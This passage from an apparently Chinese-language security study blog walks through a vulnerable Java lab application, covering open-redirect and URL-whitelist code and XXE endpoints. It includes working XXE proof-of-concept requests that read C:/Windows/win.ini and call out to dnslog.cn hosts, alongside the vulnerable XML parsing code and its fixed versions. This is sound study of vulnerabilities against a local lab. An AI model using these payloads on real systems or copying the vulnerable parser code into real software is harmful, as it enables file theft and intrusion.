class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//直接拼接 url </span><br><span class="hljs-meta">@GetMapping(&quot;/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url;<br>&#125;<br><br><span class="hljs-comment">//设置任意重定向头，手动设置 Location 响应头</span><br><span class="hljs-meta">@RequestMapping(&quot;/setHeader&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHeader</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); <span class="hljs-comment">// 301 redirect</span><br>        response.setHeader(<span class="hljs-string">&quot;Location&quot;</span>, url);<br>    &#125;<br><br><span class="hljs-comment">//用户控制跳转目标。自动设置状态码为 302 并写入 Location 头</span><br><span class="hljs-meta">@RequestMapping(&quot;/sendRedirect&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRedirect</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        response.sendRedirect(url); <span class="hljs-comment">// 302 redirect</span><br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">//u</span>rlRedirect<span class="hljs-regexp">/redirect?url=http:/</span>/www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943493.png" alt="20250726134558956"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943956.png" alt="20250726134611955"></p><h2 id="URLWhiteList"><a href="#URLWhiteList" class="headerlink" title="URLWhiteList"></a>URLWhiteList</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/vuln/url_bypass&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">url_bypass</span><span class="hljs-params">(String url, HttpServletResponse res)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    logger.info(<span class="hljs-string">&quot;url:  &quot;</span> + url);<br><br>    <span class="hljs-comment">//检查 url 是否是以 http:// 或 https:// 开头</span><br>    <span class="hljs-keyword">if</span> (!SecurityUtil.isHttp(url)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>    <span class="hljs-comment">//从 URL 对象中获取域名部分</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>    logger.info(<span class="hljs-string">&quot;host:  &quot;</span> + host);<br><br>    <span class="hljs-comment">//遍历配置的域名白名单 domainwhitelist</span><br>    <span class="hljs-comment">// endsWith .</span><br>    <span class="hljs-keyword">for</span> (String domain : domainwhitelist) &#123;<br>        <span class="hljs-keyword">if</span> (host.endsWith(<span class="hljs-string">&quot;.&quot;</span> + domain)) &#123;<br>            res.sendRedirect(url);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br></code></pre></td></tr></table></figure><ul><li>创建一个 Java 标准库的 <code>URL</code> 对象，用于解析 <code>url</code> 字符串的结构。</li><li>比如：<br> <code>url = &quot;https://www.example.com:8080/path?q=1&quot;</code><br> 则：<ul><li><code>u.getHost()</code> &#x3D; <code>&quot;www.example.com&quot;</code></li><li><code>u.getPort()</code> &#x3D; <code>8080</code></li><li><code>u.getPath()</code> &#x3D; <code>&quot;/path&quot;</code></li></ul></li></ul><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><blockquote><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><h3 id="1-xmlReader-vuln"><a href="#1-xmlReader-vuln" class="headerlink" title="1.&#x2F;xmlReader&#x2F;vuln"></a>1.&#x2F;xmlReader&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/xmlReader/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">xmlReaderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br>        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();<br>        xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// parse xml</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xmlReader xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有禁用 <code>DOCTYPE</code> 与实体相关的 SAX 特性</p><blockquote><p>SAX（Simple API for XML）解析器是一种基于事件驱动的解析方式，用于处理XML文档。与DOM解析器不同，SAX不需要将整个文档加载到内存中，因此对于大型文件尤其有用。</p></blockquote><p>POC:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /xxe/xmlReader/vuln HTTP/1.1<br>Host: 127.0.0.1:8081<br>Content-Type: application/xml<br>Content-Length: 198  可以不写<br>Connection: close<br>        此处空一行 分隔 Header 与 Body <br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [  </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>  </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>或<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包 <code>http://127.0.0.1:8081/xxe/xmlReader/vuln</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943742.png" alt="20250727115850184"></p><p>修改为 POST 提交</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/xmlReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>198<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>已经触发了 XML 解析逻辑，但是没有读取文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944650.png" alt="20250727120554070"></p><p>换一种：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/xmlReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>198<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>说明服务端 确实解析并触发了外部实体加载，访问了构造的恶意 URL</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944167.png" alt="20250727121029322"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944742.png" alt="20250727121019973"></p><h3 id="2-xmlReader-sec"><a href="#2-xmlReader-sec" class="headerlink" title="2.&#x2F;xmlReader&#x2F;sec"></a>2.&#x2F;xmlReader&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">xmlReaderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();<br>        <span class="hljs-comment">// fix code start</span><br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//fix code end</span><br>        xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// parse xml</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xmlReader xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改后的方法禁用 <code>DOCTYPE</code> 声明，禁用外部实体（GENERAL + PARAMETER）</p><h3 id="3-SAXBuilder-vuln"><a href="#3-SAXBuilder-vuln" class="headerlink" title="3.&#x2F;SAXBuilder&#x2F;vuln"></a>3.&#x2F;SAXBuilder&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-comment">//创建一个 JDOM2 的 SAXBuilder 实例，它用于将 XML 字符串解析成一个 JDOM Document 对象</span><br>        <span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();<br>        <span class="hljs-comment">// org.jdom2.Document document</span><br>        builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// cause xxe</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXBuilder xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SAXBuilder</code> 默认开启了对 <strong>外部实体</strong> 的支持</p><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXBuilder/vuln</span>  <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> 127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://v50sch.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944871.png" alt="20250727122448607"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944391.png" alt="20250727122444351"></p><h3 id="4-SAXBuilder-sec"><a href="#4-SAXBuilder-sec" class="headerlink" title="4.&#x2F;SAXBuilder&#x2F;sec"></a>4.&#x2F;SAXBuilder&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXBuilderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span 